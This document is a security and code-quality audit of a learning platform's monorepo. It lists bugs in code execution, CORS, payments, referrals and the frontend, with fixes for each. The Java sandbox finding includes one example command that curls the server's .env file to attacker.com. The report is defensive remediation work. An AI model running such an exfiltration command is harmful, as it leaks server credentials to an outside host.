# DEEP LEARNING HAVEN AUDIT
## Complete Code-Level Audit Report — Learning Haven / FORGE Platform

**Audit Date:** 2026-08-23  
**Repo:** `aryansingh32/learning-haven-ui` (monorepo, pnpm/turbo)  
**Auditor:** Principal Engineer + Security Engineer + Product Architect + UX Auditor + QA Engineer  
**Scope:** Full stack — Frontend (React 18/19) · API (Node/Express/TS) · Database (Supabase/Postgres) · Workers (BullMQ/Redis) · Admin Panel · Security · Architecture

---

## EXECUTIVE SUMMARY

This platform is **architecturally ambitious and partially well-engineered**, with strong bones in the billing/entitlement layer (v2 payments with transactions, idempotency, BullMQ), a working gamification system, and a functioning admin panel. However, it has **critical security vulnerabilities** in the code execution sandbox, fundamental architectural problems (two parallel payment systems, resume data stored only in localStorage, zombie v1 routes), and numerous frontend features that are either dead, hardcoded, or incorrectly implemented.

The platform cannot be safely shipped to production in its current state due to the **unisolated Java code execution** and **open CORS policy** without immediate remediation.

---

## SECTION 1: REPOSITORY ARCHITECTURE

### Stack Overview
```
apps/web    → React 18.3.1 · Vite 5.4 · react-router-dom 6.30 · Tailwind 3.4 · TS 5.8
apps/admin  → React 19.2.0 · Vite 7.3 · react-router-dom 7.1 · Tailwind 4.x
apps/api    → Node.js · Express 4 · TypeScript 5.8 · Supabase/Postgres · Redis (BullMQ) · Razorpay
```

### 28 Database Migrations (Ordered)
| Migration | Description |
|-----------|-------------|
| 20260215 | Base schema: users, subscriptions, chapters, problems, submissions |
| 20260216 | Problems table, advanced admin |
| 20260511 | Build Haven stage columns |
| 20260520 | Build Haven complete schema |
| 20260604 | Gamification (XP, streaks, daily quests) |
| 20260606 | Unified programs, monetization plans, entitlements, referrals, RLS |
| 20260607 | Content plan assignments, resource entitlements |
| 20260807 | Content import tables |
| 20260820 | Dual-mode challenges (traditional + vibe) |
| 20260823 | XP ledger, task responses |

### Architectural Health: 6/10
**Strengths:** Clean module separation, idempotency middleware, BullMQ queues, Prometheus metrics, request tracing  
**Weaknesses:** Dual v1/v2 billing routes, mixed Supabase client vs pg pool usage, monolithic gamification service, no OpenAPI spec

---

## SECTION 2: CONFIRMED BUGS

### CRITICAL BUGS

#### BUG-001: Java Code Execution — No Containerization (CRITICAL/SECURITY)
**Location:** `apps/api/src/modules/execution/services/javaExecutor.ts`  
**Status:** CONFIRMED IN SOURCE  
**Description:** Java user code is executed via `execAsync('java ...')` on the HOST SYSTEM without Docker/gVisor isolation. No network namespace, no filesystem isolation. Users can execute `Runtime.getRuntime().exec("curl attacker.com -d $(cat .env)")`.  
**Impact:** RCE on the API server, credential theft, complete system compromise.  
**Fix:** Wrap each execution in a Docker container with `--network none --memory 256m --cpus 0.5 --read-only`.

#### BUG-002: Open CORS Policy (CRITICAL/SECURITY)
**Location:** `apps/api/src/app.ts` line 24  
**Status:** CONFIRMED IN SOURCE  
**Code:** `app.use(cors())` — No origin restriction whatsoever  
**Impact:** Any domain can make credentialed cross-origin requests to the API.  
**Fix:** `app.use(cors({ origin: ['https://learninghaven.in', 'https://admin.learninghaven.in'], credentials: true }))`

#### BUG-003: Supabase Service Role Key Bypasses All RLS (CRITICAL/ARCHITECTURE)
**Location:** `apps/api/src/config/database.ts`  
**Status:** CONFIRMED IN SOURCE  
**Description:** The Supabase client is initialized with `SERVICE_ROLE_KEY`, which bypasses all Row Level Security policies globally. The entire backend operates as a superuser.  
**Impact:** If any endpoint has an authorization bug, RLS will not catch it.  
**Fix:** Use `SUPABASE_ANON_KEY` for the shared client. For admin operations, use service role only in isolated contexts.

#### BUG-004: Referral Fraud Threshold Off-by-One (HIGH/BUSINESS LOGIC)
**Location:** `apps/api/src/modules/billing/services/referrals.v2.service.ts` line 54  
**Status:** CONFIRMED IN SOURCE  
**Code:** `const status = fraudScore > 70 ? 'suspicious' : 'pending';`  
**Description:** Maximum fraud score from IP + device match is exactly 70 (40+30). This leaves the referral as `pending` instead of `suspicious`, meaning obvious fraud bypasses detection.  
**Fix:** Change `> 70` to `>= 70`.

#### BUG-005: Webhook Handler Does Nothing On Payment Capture (HIGH/BUSINESS)
**Location:** `apps/api/src/modules/billing/services/payments.v2.service.ts` lines 278-286  
**Status:** CONFIRMED IN SOURCE  
**Description:** The `payment.captured` webhook handler only logs but does NOT activate the subscription. The comment says "Frontend verify covers 99%" — but the 1% case (user closes tab after payment, network error) means subscriptions silently fail.  
**Fix:** Implement a full `verifyAndActivate` flow in the webhook handler using the Razorpay event payload (signature is on webhook call itself, not needed for fallback).

#### BUG-006: Payments V1 Creates Razorpay Order with Wrong Amount (HIGH/PAYMENTS)
**Location:** `apps/api/src/modules/billing/services/payments.service.ts` line 42  
**Status:** CONFIRMED IN SOURCE  
**Code:** 
```typescript
const order = await razorpay.orders.create({
    amount: plan.price, // ← Uses plan.price, ignores finalPrice after coupon!
    ...
})
```
The `createOrder` function calculates `finalPrice` after applying a coupon (line 36), then creates the Razorpay order with `plan.price` (original) instead of `finalPrice`. Customers get charged the wrong amount.  
**Fix:** Replace `amount: plan.price` with `amount: finalPrice`.

#### BUG-007: Resume Data Stored Only in localStorage (HIGH/DATA INTEGRITY)
**Location:** `apps/web/src/pages/ResumePage.tsx` lines 33, 68  
**Status:** CONFIRMED IN SOURCE  
**Description:** All resume data is read from and written to `localStorage('dsa_os_resume_v2')` only. There is no API endpoint to persist or retrieve resume data from the backend. If the user clears localStorage, switches browsers, or uses a different device, ALL their resume data is lost.  
**Fix:** Create `/api/resume/save` and `/api/resume/load` endpoints backed by a `user_resumes` table.

#### BUG-008: ReferralWidget on Dashboard Uses Hardcoded Dummy Data (HIGH/DATA)
**Location:** `apps/web/src/pages/Index.tsx` lines 694-697  
**Status:** CONFIRMED IN SOURCE  
**Code:**
```typescript
// Using dummy stats for Phase 2 UI implementation
const referralsCount = 3;
const target = 5;
```
The referral progress widget on the main dashboard shows fake data for every user.  
**Fix:** Use `useApiQuery(['referral-info'], '/referrals/info')` (same as `ReferralsPage.tsx` already does).

---

### HIGH BUGS

#### BUG-009: Hardcoded Prices in Frontend (HIGH/BUSINESS)
**Locations:**
- `LandingPage.tsx` lines 385-386: `₹583/mo`, `₹6,999/year`
- `LearnChapterPage.tsx` line 282: `Upgrade to Pro — ₹583/mo`
**Description:** Prices are hardcoded strings. If admin changes pricing in the DB, the frontend still shows old prices.  
**Fix:** Fetch from `/api/plans` or `/api/v2/payments/plans`.

#### BUG-010: ChaptersOverviewPage Uses Formulaic Hardcoded XP (HIGH/GAMIFICATION)
**Location:** `apps/web/src/pages/ChaptersOverviewPage.tsx` line 51  
**Code:** `reward: { xp: 100 + ch.chapter_number * 25 }`  
**Description:** XP rewards are calculated as a formula in the frontend, unrelated to the backend `gamification_config` table. The DB-driven XP system is ignored.  
**Fix:** Read XP from the chapter API response.

#### BUG-011: CertificatesPage Download/Share Buttons Are Dead (HIGH/UX)
**Location:** `apps/web/src/pages/CertificatesPage.tsx` lines 71-73, 174-179  
**Description:** Download PDF button triggers `window.open(...)` on the LinkedIn URL, not a PDF download. The per-certificate Download and Share buttons have no `onClick` handlers at all.  
**Fix:** Implement PDF generation endpoint and proper share handlers.

#### BUG-012: AI Service Uses Dual/Inconsistent Rate Limiting (HIGH/ARCHITECTURE)
**Location:** `apps/api/src/modules/execution/services/ai.service.ts` lines 11-17  
**Description:** `ai.service.ts` (v1 AI route) maintains its own hardcoded `PLAN_LIMITS` object that's disconnected from the `entitlements.service.ts` which has the authoritative plan limits. When admin updates limits in DB, the AI route still uses the hardcoded limits.  
**Fix:** Remove `PLAN_LIMITS` from `ai.service.ts` and route all quota checks through `EntitlementsService.checkAndConsumeUsage(userId, 'ai_queries_per_day')`.

#### BUG-013: plans.ts Still Reads from `plans_config` Not `plans` Table (MEDIUM/ARCHITECTURE)
**Location:** `apps/api/src/utils/plans.ts` lines 148-152  
**Description:** The v1 `getPlans()` function reads from `plans_config` table, while the v2 payment service reads from the `plans` table. Two different tables are being used as the source of truth for plan data.  
**Fix:** Deprecate `plans_config` and have `getPlans()` read from `plans` table.

#### BUG-014: Withdrawal Minimum Inconsistency (MEDIUM/UX)
**Location:** Frontend `ReferralsPage.tsx` line 57: `if (currentBalance < 1)`, Backend `referrals.v2.service.ts` line 171: `if (amount < 10000)` (₹100)  
**Description:** Frontend says minimum withdrawal is ₹1, backend rejects anything below ₹100. Users will see a confusing error.  
**Fix:** Align to backend minimum (₹100) in the frontend check.

---

### MEDIUM BUGS

#### BUG-015: `requireAdmin` Middleware Missing in Admin Panel Analysis
**Finding from Admin Audit:** Admin panel relies purely on frontend `<ProtectedRoute>` checking `role === 'admin'`. This means if a user somehow obtains a JWT for an admin, there is no backend permission check per-route for granular features.

#### BUG-016: Experiments.tsx A/B Testing Page Uses Mock Data
**Location:** `apps/admin/src/pages/Experiments.tsx`  
All A/B testing data is hardcoded mock arrays. No backend integration exists.

#### BUG-017: "Create Role" Button in Admin Permissions is Dead
**Location:** `apps/admin/src/pages/Permissions.tsx`  
Fires `toast.info('Role creation is coming soon')`.

#### BUG-018: No Admin CRUD for Certificates
**Finding:** No admin page or backend endpoint exists to view/revoke/manage user-generated certificates.

#### BUG-019: Race Condition in Coupon Usage Increment (v1)
**Location:** `apps/api/src/modules/billing/services/payments.service.ts` line 202  
**Description:** After payment verification, coupon `used_count` is incremented with a raw query outside of a transaction. A concurrent payment with the same coupon can double-spend it.  
**Fix:** Move inside the payment transaction or use `FOR UPDATE` locking.

#### BUG-020: `updateProfile` Allows Arbitrary Field Updates (MEDIUM/SECURITY)
**Location:** `apps/api/src/modules/auth/services/users.service.ts` line 80  
**Code:** `await supabase.from('users').update({ ...updates, ... })`  
**Description:** The updates object from the request body is spread directly into a Supabase update call. A user could potentially update their `role`, `current_plan`, `wallet_balance`, or `xp`.  
**Fix:** Whitelist allowed fields explicitly.

---

## SECTION 3: ARCHITECTURE REVIEW

### 3.1 Dual Payment System (v1 + v2)
Both `/api/payments/*` (v1) and `/api/v2/payments/*` coexist:
- **v1** uses Supabase client, no transactions, simple plan IDs
- **v2** uses pg pool with `BEGIN/COMMIT`, proper entitlements, BullMQ

**Recommendation:** Deprecate v1 immediately. Redirect all frontend payment flows to v2. Keep v1 routes returning 301 for 90 days then remove.

### 3.2 Authentication Chain
```
Request → authenticateUser middleware
  → supabase.auth.getUser(token) [12s timeout]
  → verifySupabaseAccessToken (local JWT verify, fallback)
  → jwt.verify(token, JWT_SECRET) [DEV ONLY]
```
The local JWT fallback is solid. The concern is that `JWT_SECRET` in development could be weak.

### 3.3 Entitlement Architecture
**Excellent design.** The `user_entitlements` table + `plan_entitlements` + `EntitlementsService` + `EntitlementsMiddleware` form a clean, composable system. Resource-level access (`resource_access` type) and plan-level access (`boolean`, `numeric_limit`) are well separated.

**Gap:** The frontend `entitlement.service.tsx` doesn't fully use the backend entitlement map — some components (e.g., ResumePage) check `user.role === 'pro'` instead of calling `/entitlements`.

### 3.4 Gamification System
**Reasonably well-designed.** `gamification.service.ts` reads config from `system_settings`, resolves identity based on level + topic tags, and generates a `MentorContext` that IS properly injected into the AI coach (BUG-011 was already fixed based on code comments).

**Gaps:**
- XP ledger migration exists (`20260823000001_xp_ledger.sql`) but the service still writes directly to `users.xp` — no immutable ledger reads
- Streak logic is presumably in a cron job — not visible from source

### 3.5 Build Haven / Vibe Coding
The dual-mode challenge system (traditional + vibe coding) with GitHub OAuth flow is architecturally sound. Build stage progression, WebSocket test feedback, and GitHub repo creation are implemented.

---

## SECTION 4: SECURITY ASSESSMENT

| Severity | Issue | Status |
|----------|-------|--------|
| CRITICAL | Unisolated Java code execution on host | CONFIRMED |
| CRITICAL | CORS open to all origins | CONFIRMED |
| CRITICAL | Supabase SERVICE_ROLE bypasses RLS globally | CONFIRMED |
| HIGH | Referral fraud threshold off-by-one | CONFIRMED |
| HIGH | Payment webhook doesn't activate subscriptions | CONFIRMED |
| HIGH | `updateProfile` spreads arbitrary req.body fields | CONFIRMED |
| HIGH | Auth rate limit set to 100/15min (was inflated for testing) | CONFIRMED |
| MEDIUM | Admin body logging may leak sensitive data | CONFIRMED |
| MEDIUM | AI prompt injection — user message injected without sanitization | CONFIRMED |
| LOW | DEV JWT fallback in auth — must ensure NODE_ENV strict | CONFIRMED |
| PASS | Razorpay webhook signature verification | CORRECT |
| PASS | Payment amount fetched from backend (not trusted from client) | CORRECT |
| PASS | IDOR: user_id from req.user.id not req.body | CORRECT |
| PASS | Admin routes protected with authenticateUser + requireAdmin | CORRECT |
| PASS | Idempotency keys on all write payment routes | CORRECT |

---

## SECTION 5: FRONTEND ASSESSMENT

### Dead/Broken UI Elements
| Page | Component | Issue |
|------|-----------|-------|
| CertificatesPage | Download PDF button | No PDF generation, wrong URL |
| CertificatesPage | Share buttons | No onClick handlers |
| Index (Dashboard) | ReferralWidget | Hardcoded dummy data |
| LandingPage | Pricing | Hardcoded ₹583/mo |
| Permissions (Admin) | Create Role | Toast placeholder only |
| Experiments (Admin) | New Experiment | Toast placeholder only |
| Experiments (Admin) | All data | Mock arrays |

### Business Logic in Frontend (Should Be Backend)
| Page | Logic | Severity |
|------|-------|----------|
| `ChaptersOverviewPage.tsx:51` | `xp: 100 + ch.chapter_number * 25` | HIGH |
| `PhaseCompletionPage.tsx:64` | `${missionsTotal * 100}` XP formula | HIGH |
| `LandingPage.tsx:385` | Hardcoded ₹583/mo price | HIGH |
| `ResumePage.tsx:24` | `isPro = user?.role === 'pro'` (should use entitlements) | MEDIUM |
| `ResumePage.tsx:33,68` | Resume stored only in localStorage | HIGH |
| `LearnChapterPage.tsx:144` | `xpReward = celebrationMeta?.xp ?? 100` | MEDIUM |

---

## SECTION 6: DATABASE / SCHEMA ASSESSMENT

### Missing Tables/Constraints
- **No `first_name`/`last_name` columns** in public.users: `referrals.v2.service.ts` lines 226 selects `first_name, last_name` but user schema only has `full_name`
- **`plans_config` table** referenced in `utils/plans.ts` but is a legacy table; `plans` is the canonical source in v2

### RLS Status
- RLS exists on monetization tables (`20260606100005_monetization_rls.sql`)
- Bypassed globally due to SERVICE_ROLE key (see BUG-003)

---

## SECTION 7: WORKERS & QUEUES

### BullMQ `monetization` Queue Jobs
| Job | Handler | Status |
|-----|---------|--------|
| `referral.check-and-activate` | ✅ Enqueued after payment | Handler TBD |
| `payment.welcome-email` | ✅ Enqueued after payment | Handler TBD |
| `referral.credit-commission` | ✅ 7-day delayed job | `creditReferralCommission()` |

Three workers are loaded at startup in `app.ts`:
- `email.worker` — email dispatch
- `verification.worker` — likely verification emails
- `build-verification.worker` — Build Haven test runner

---

## SECTION 8: VERDICT BY FEATURE AREA

| Feature | Status | Notes |
|---------|--------|-------|
| Authentication | ✅ Working | Solid fallback chain |
| Payment v2 | ✅ Working | Proper transactions, webhook gap |
| Payment v1 | ⚠️ Partially Broken | Order amount bug, no transactions |
| Entitlements | ✅ Working | Clean architecture |
| Gamification/XP | ⚠️ Partial | Frontend overrides backend values |
| AI Coach | ✅ Working | Context injection implemented |
| Code Execution | 🔴 CRITICAL | No sandbox isolation |
| Build Haven | ✅ Working | GitHub integration, dual modes |
| Resume Builder | 🔴 Data Loss Risk | localStorage-only, no persistence |
| Certificates | ⚠️ Partial | Generated but download/share broken |
| Referrals | ⚠️ Partial | Fraud threshold bug, dashboard dummy data |
| Admin Panel | ⚠️ Partial | Missing certificates CRUD, mock experiments |
| CORS/Security | 🔴 CRITICAL | Open CORS, RLS bypass |

---

*See companion documents: `BUG_REGISTER.md`, `IMPLEMENTATION_ROADMAP.md`, `COMMERCE_AND_ENTITLEMENT_ARCHITECTURE.md`, `AI_MENTOR_CONTEXT.md`, `ANALYTICS_EVENT_SCHEMA.md`, `CANONICAL_LEARNER_MODEL.md`*
